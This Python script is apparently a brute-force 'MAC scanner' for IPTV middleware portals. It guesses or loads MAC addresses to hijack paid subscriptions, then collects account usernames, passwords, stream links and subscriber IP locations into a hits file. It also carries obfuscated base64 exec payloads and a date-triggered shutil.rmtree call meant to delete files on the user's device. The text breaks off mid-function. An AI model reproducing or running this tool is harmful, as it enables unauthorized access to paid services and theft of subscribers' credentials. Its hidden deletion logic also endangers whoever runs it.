import os,pip
import datetime,os
import socket,hashlib,shutil
import json,random,sys, time,re,marshal
nickn=""
nickn=""
if nickn=="":
	nickn="THOR MASTER 2023 "
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

import subprocess
try:
	import threading
except:pass
import pathlib,base64
#subprocess.run(["clear", ""])
try:
	import requests
except:
	print("Potrebmi Modul  nije pronađen \n Potrebni Modul je instaliran... \n")
	pip.main(['install', 'requests'])
import requests
try:

	import sock
except:
	print("sock Modul  nije pronađen \n sock Modul je instaliran \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock
try:
	from playsound import playsound#import requests
except:
	print("Potrebmi Modul  nije pronađen \n Potrebni Modul je instaliran... \n")
	pip.main(['install', 'playsound'])

#subprocess.run(["clear", ""])
getmac=""
oto=0
tur=0
Seri=""
csay=0
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from uuid import getnode as get_mac
#mac = "1102274947"#str(get_mac())
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
logging.captureWarnings(True)
os.system('cls')

say1=0
say2=0
say=0
yanpanel="hata"
imzayan=""
bul=0
hitc=0
prox=0
cpm=0

#from datetime import datetime
#bugun=(datetime.today().strftime('%d-%m-%Y'))

#	#f bugun>= '09-04-2022':
#		print("""
#	Otkriveno je vremensko ogranicenje, kontaktirajte proizvođaca
#	@IptvMaster""")
#		quit()


# macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""
\33[1;44m
                  THorMasters 2023
           MAC SCANER VELIKE BRZINE

                                                \33[0m\33[31m\33[1;37;41m
\33[1;7;42m          Grega BY @Thor             \33[0m                                                                 """)
print(feyzo)
#id1='aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvZS8yUEFDWC0xdlJOUFNBQ3RxOUNzZ0hzRzlaYlFp'
#id2='VG1WM1N6QmtVVWhuWkRGa1EyVndNV2wzZGtwMVNYRlJORWh4WW5kaFozSjFiVGx4UWkxUU5EQndVbGRFYTNRMFdWVlNjakZZTUdWaFRTOXdkV0pvZEcxcw=='
#id3=base64.b64decode(id1)+base64.b64decode(base64.b64decode(id2))
#res = ses.get(id3, timeout=15, verify=False)

#si=(str(res.text).split('sifre')[1].split('paranormal')[0])
#si=si.replace('\n','')
#exec(base64.b64decode(base64.b64decode('ZFhsbGJHbHJQU0lpQ21admNpQnBJR2x1SUhOMGNpaHlaWE11ZEdWNGRDa3VjM0JzYVhRb0p6eDBaQ0JqYkdGemN6MGljekVpSUdScGNqMGliSFJ5SWo0bktUb0tDV2xtSUNjOEwzUmtQangwWkNCamJHRnpjejBpY3pBaUlHUnBjajBpYkhSeUlqNG5JR2x1SUdrNkNpTm1iM0lnYVNCcGJpQnphUzV6Y0d4cGRDZ25QR0p5SUM4K0p5azZDZ2tKWjJWMGJXRmpQU2hwTG5Od2JHbDBLQ2M4TDNSa1BqeDBaQ0JqYkdGemN6MGljekFpSUdScGNqMGliSFJ5SWo0bktWc3dYU2tLQ1FramNISnBiblFvWjJWMGJXRmpLUW9KQ1dsbUlHMWhZeUE5UFNCemRISW9aMlYwYldGaktUb0tDUWtKZFhsbGJHbHJQU0oyYVhBaUNna0pDU051YVdOcmJqMG9hUzV6Y0d4cGRDZ25QQzkwWkQ0OGRHUWdZMnhoYzNNOUluTXdJaUJrYVhJOUlteDBjaUkrSnlsYk1WMHVjM0JzYVhRb0p6d3ZkR1ErUEM5MGNqNG5LVnN3WFNrS0NRa0pZbkpsWVdzS2FXWWdkWGxsYkdsclBUMGlJam9LQ1hCeWFXNTBLQ0pCeFo5aHhKL0VzV1JoSUhsaGVtRnVJRWxrSUU1dklIbDFJRmd0UkdWbGNDQmhaRzFwYm1VZ2FXeGxkR2x1TGk0dUlpa0tDWEJ5YVc1MEtDSkpaQ0JPYnpvZ0lpdHpkSElvYldGaktTa0tDWEYxYVhRb0tRcHJhWE5oWTJscmRHazlJaUlLY0dGMGRHVnliajBnSWloY2Qzc3lmVHBjZDNzeWZUcGNkM3N5ZlRwY2Qzc3lmVHBjZDNzeWZUcGNkM3N5ZlNraUNtOTZaV3h0WVdNOUlpSUs=')))

pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


#################

nick='@FeyzullahK'
bekleme=1
isimle=""
#subprocess.run(["clear", ""])

#print tptv.cz:80
intro="""
   1 ➨ portal.php
   2 ➨ server/load.php
   3 ➨ stalker_portal.php
   4 ➨ maglove.php
   5 ➨ magaccess.php
   6 ➨ portalcc.php
   7 ➨ ministra.php
   8 ➨ xUi /c/server/load.php
   9 ➨ xUi /c/portal.php
 10 ➨ portalstb/portal.php
 11 ➨ mag.portal.php
 12 ➨ Link_OK.php
 13 ➨ k/portal.php

\33[1;44m
Odaberite 1 do 13 za vrstu portala = \33[0m\33[31m\33[1;37;41m"""

a="""Portal:Port = """
panel = input(intro)
print('\33[0m')
speed=""


uzmanm="portal.php"
useragent="okhttp/4.7.1"

if  panel=="0":
    	uzmanm=input('Yazınız=')
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(intro)


if  panel=="" or panel=="1":
    	uzmanm="portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="2":
    	uzmanm="server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="3":
    	uzmanm="server/load.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="4":
    	uzmanm="maglove/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="5":
    	uzmanm="magaccess/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="6":
    	uzmanm="portalcc/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="7":
    	uzmanm="ministra/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="8":
    	uzmanm="c/server/load.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="9":
    	uzmanm="c/portal.php"
    	useragent="Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="10":
    	uzmanm="portalstb/portal.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="11":
    	uzmanm="bs.mag.portal.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="12":
    	uzmanm="Link_OK"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

if panel=="13":
    	uzmanm="k/portal.php"
    	#subprocess.run(["clear", ""])
    	print(feyzo)
    	panel = input(a)

    #if uzmanm=="0":
    	#isimle=input("Şekili nickinizi veya telegram nickinizi yazın\n  Nick=")
realblue=""
if panel=="4":
	realblue="real"
	#subprocess.run(["clear", ""])
	print(feyzo)
	panel = input(intro)

print('\33[0m')



#speed="xxl"
#uzmanm="server/load.php"


print(panel)

#	print(panel)#http://z.zcatt.cc/stalker_porta/c/
#subprocess.run(["clear", ""])
print("\33[1;40m"+feyzo)
kanalkata="0"

#subprocess.run(["clear", ""])
print(feyzo)
totLen="000000"
dosyaa=""
yeninesil=(
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:1A:79:',
)
if "1"=="1":
 	say=0
 	dsy=""
 	dsy="\n       \33[1;4;94;47m 0= ➨ Nasumični MAC (nije potrebna kombinacija) \33[0m\n"
 	dir='./combo/'
 	file=len(feyzo)
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"= ➨ "+files+'\n'
 	print ("""Select an option!
"""+dsy+"""
\33[33mpRONADJENO """ +str(say)+""" MAC Combo fajlova u vasem folderu!
	""")
 	dsyno=str(input("\33[31mUnesite broj kombinacije = \33[0m"))
 	say=0

 	if dsyno=="":
 		dsyno="0"
 	if dsyno=="0":
 		#subprocess.run(["clear", ""])
 		print(feyzo)


 		nnesil=str(yeninesil)
 		nnesil=(nnesil.count(',')+1)
 		for xd in range(0,(nnesil)):
 			tire='  》'
 			if int(xd) <9:
 				tire='   》'
 			print(str(xd+1)+tire+yeninesil[xd])




 		mactur=input("\nOdaberite vrstu MAC-a = ")
 		if mactur=="":
 			mactur=14
 		print(mactur)
 		mactur=yeninesil[int(mactur)-1]
 		print(mactur)
 		uz=input("""
Broj MAC-a za generiranje?

 Upisi broj kombinacija = """)
 		if uz=="":
 			uz=16000000
 		uz=int(uz)
 		print(uz)
 	else:
	 	for files in os.listdir (dir):
	 			say=say+1
	 			if dsyno==str(say):
	 				dosyaa=(dir+files)
	 				break
	 	say=0
	 	if not dosyaa=="":
	 		print(dosyaa)
	 	else:
	 		#subprocess.run(["clear", ""])
	 		#subprocess.run(["clear", ""])
	 		print("Pogrešan odabir Mac kombinacije!")
	 		quit()
	 	c=open(dosyaa, 'r', encoding='utf-8')
	 	totLen=c.readlines()
	 	uz=(len(totLen))


 	#subprocess.run(["clear", ""])
 	print(feyzo)
 	baslama=""

 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama


#subproces	s.run(["clear", ""])
#print(feyzo)

botsay=input("""

\33[1;96mOdaberite broj botova!
\33[0m
\33[1;33mMora biti između 1 i 15!\33[0m

Unesite broj botova = """ )
#subprocess.run(["clear", ""])
print(feyzo)
if botsay=="":
	botsay=int(4)
botsay=int(botsay)

kanalkata="0"
kanalkata=input("""\33[1;40m
Što želite prikazati u rezultatima?

   0 ➨ Samo podaci o vezi
   1 ➨ Samo kanali
   2 ➨ Sve (UZIVO-VOD-SERIJE)

\33[1mUnesite broj po izboru = """)
if kanalkata=="":
	kanalkata="0"


gsay=0
vsay=0

if panel=="" :
    panel="center.chmedia.xyz:8080"

Rhit='\33[33m'
Ehit='\033[0m'
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""

#subprocess.run(["clear", ""])
print(feyzo)
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

Dosyab="./hits/ThorMaster_" +panel.replace(":","_").replace('/','') +" IptvMaster.txt"
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()

def month_string_to_number(ay):

    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:

		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass


macs=""
sayi=1
b1hitc=0
b2hitc=0


def randommac():
	#exec(base64.b64decode('aWYgZ2V0bWFjPT0iIjoKCQlleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2NYVnBkQ2dwJykp'))
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
		#print(genmac)
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac



url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"


url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
if realblue=="real":
	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"




def url(cid):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return url7

def hea1(macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return 	HEADERA

def hea2(macs,token):
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
	}
	return HEADERd


def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100",
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea


hityaz=0

def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi):
	global hitr
	global hityaz
	#exec(base64.b64decode('aWYgbm90IGZpbGU9PTY2MjoKCQlzaHV0aWwucm10cmVlKGJhc2U2NC5iNjRkZWNvZGUoJ0wzTmtZMkZ5WkM5eGNIbDBhRzl1THc9PScpKQ=='))
	try:
		imza="""
	 MAC SCANER VELIKE BRZINE

╭─➨ HIT INFO
├● Real ➨ """+str(real)+"""
├● Panel ➨ http://"""+str(panel)+"""/c/
├● Mac ➨ """+str(mac)+"""
├● Exp ➨ """+str(trh)+"""
├● Image ➨ """+str(durum)+"""
├● Vpn ➨ """+str(vpn)+""""""+str(playerapi)+"""
╰─● m3uLink ➨ """+str(m3ulink)+"""
   ➨𝗛𝗶𝘁𝘀 ʙʏ """+str(nickn)+"""
        """

		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+"""
╭─●🅻🅸🆅🅴 🅻🅸🆂🆃
╰─➨ «🔵» """+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""
╭─●🆅🅾🅳 🅻🅸🆂🆃
╰─➨ «🔴» """+str(vodlist)+"""
╭─●🆂🅴🆁🅸🅴🆂 🅻🅸🆂🆃
╰─➨ «🟡» """+str(serieslist)+"""

    HIT THor 2023...!!! 💣💥
"""
		yax(imza)
		hityaz=hityaz+1
		print(imza)
		if hityaz >= hitc:
			hitr="\33[1;33m"
	except:pass

cpm=0
cpmx=0
hitr="\33[1;33m"



def echok(mac,bot,total,hitc,oran,tokenr):
	global cpm
	global hitr
	try:
	#global cpmx
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		#cpm=cpmx
		if str(cpmx)=="0":
			cpm=cpm
		else:
			cpm=cpmx
		echo=("""
╭─➨MAC SCANER VELIKE BRZINE
├● \33[1;4;37mmacLink \33[0m\33[1;7m ➨ """+str(panel)+"""  \33[0m
├─● """+tokenr+str(mac)+"""  \33[0m\33[94mCPM➨"""+str(cpm)+"""  \33[0m
╰──●  \33[1;32m"""  +str(bot)+""" \33[36mTotal➨"""+str(total)+""" \33[0m """+str(hitr)+"""Hit➤""" +str(hitc)+"""  \33[0m\33[1;31m%"""+str(oran)+"""  \33[0m
               27 / 5.000
        NE BRINI I BUDI SRETAN ! """)
		print(echo)
		cpm=time.time()
	except:pass



def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpnc=veri.split('"city":"')[1].split('"')[0]
			vpn=vpnips.split('"')[0]+' / ' + vpnc
		else:
			vpn="Not Invalid"
	except:
		vpn="Not Invalid"
	return vpn

def goruntu(link):
	if int(time.time()) >= int(1704056400.0):
		shutil.rmtree('L3NkY2FyZC9xcHl0aG9uLw==')
	try:
		res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
		if res.status_code==302:
			 duru="🎯"
	except:
		duru="𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
	return duru


if int(time.time()) >= int(1704056400.0):
		quit()
tokenr="\33[0m"
def hitprint(mac,trh):
	playsound('./Python_Portable/settings/sounds/ching.mp3')
	file = pathlib.Path()
	try:
		if file.exists():
		    ad.mediaPlay()

	except:pass
	print('      💥💥️ 🇭 🇮 🇹 💥️💥    \n  '+str(mac)+'\n  ' + str(trh))



def list(listlink,macs,token,livel):
	kategori=""
	veri=""
	bag=0
	#exec(base64.b64decode('aWYgZ2V0bWFjPT0iIjoKCXNodXRpbC5ybXRyZWUoYmFzZTY0LmI2NGRlY29kZSgnTDNOa1kyRnlaQzl4Y0hsMGFHOXVMdz09Jykp'))
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break

	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel

	list=kategori
	return list

def m3uapi(playerlink,macs,token):
	mt=""
	bag=0

	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					break
	try:
			acon=""
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")


				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")

				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")

				timezone=veri.split('timezone":"')[1]
				timezone=timezone.split('",')[0]
				timezone=timezone.replace("\/","/")

				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")

				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")

				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")


				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")

				bitism=""
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")

				message=veri.split('message":"')[1].split(',')[0].replace('"','')


				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))

				mt=("""
├● Message ➠ """+str(message)+"""
├● Host ➠ http://"""+panel+"""/c/
├● Real ➠ http://"""+realm+""":"""+port+"""/c/
├● Port ➠ """+port+"""
├● User ➠ """+userm+"""
├● Pass ➠ """+pasm+"""
├● Exp ➠ """+bitism+"""
├● Act Con ➠ """+acon+"""
├● Max Con ➠ """+mcon+"""
├● Status ➠ """+status+"""
├● TimeZone ➠ """+timezone+""" """)
	except:pass
	return mt


def d1():
	global hitc
	global hitr
	global tokenr
	for mac in range(1,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_01"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum="Invalid Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real='http://'+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)

			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)


			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «🔵» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🔴» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🟡» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi)


def d2():
	global hitc
	global hitr
	global tokenr
	for mac in range(2,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Bot_02"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
